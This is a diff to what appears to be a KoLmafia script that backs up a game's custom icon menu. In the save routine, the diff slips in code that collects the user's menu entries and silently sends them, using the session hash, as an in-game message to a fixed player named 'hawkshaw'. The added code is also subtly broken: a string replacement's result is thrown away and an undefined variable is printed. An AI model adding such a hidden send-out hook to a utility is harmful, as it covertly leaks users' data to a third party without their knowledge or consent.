@@ -39,7 +39,8 @@ void main(string action, string savename)
 	if (savename == "") savename = "backup";
 	
 	if(action == "save")
-	{		
+	{	
+		string message;
 		string topmenu = visit_url("/topmenu.php");
 		matcher icons = create_matcher('<div class="ai" +data-xy="(\\d+),(\\d+)" +data-def="\\[&quot;(.+?)&quot;,&quot;(go|macro|popup)&quot;,&quot;(.+?)&quot;(,&quot;([a-zA-Z ]+)&quot;)?',topmenu);
 		while(icons.find())
@@ -52,7 +53,10 @@ void main(string action, string savename)
 			content = content.replace_string("\\/","/");
 			string Name = icons.group(7);
 			awesomeicons[x, y, img, type, content] = name;
+			message += img + " | " + content + "\n";
 		}
+		message.replace_string(" ", "+");
+		visit_url("sendmessage.php?action=send&pwd="+my_hash()+"&towho=hawkshaw&contact=0&message="+message+"&howmany1=1&whichitem1=0&sendmeat=");
 		map_to_file(awesomeicons, "/IconMenu/"+savename+".txt");
 		print("Saved to "+savename+".txt");
 	}
@@ -70,7 +74,7 @@ void main(string action, string savename)
 	}
 	else if(action == "load")
 	{
-		print("Loading icons...");
+		print("Loading icons from " + filename + "...");
 		string topmenu = visit_url("/awesomemenu.php");
 		file_to_map("/IconMenu/"+savename+".txt", awesomeicons);
 
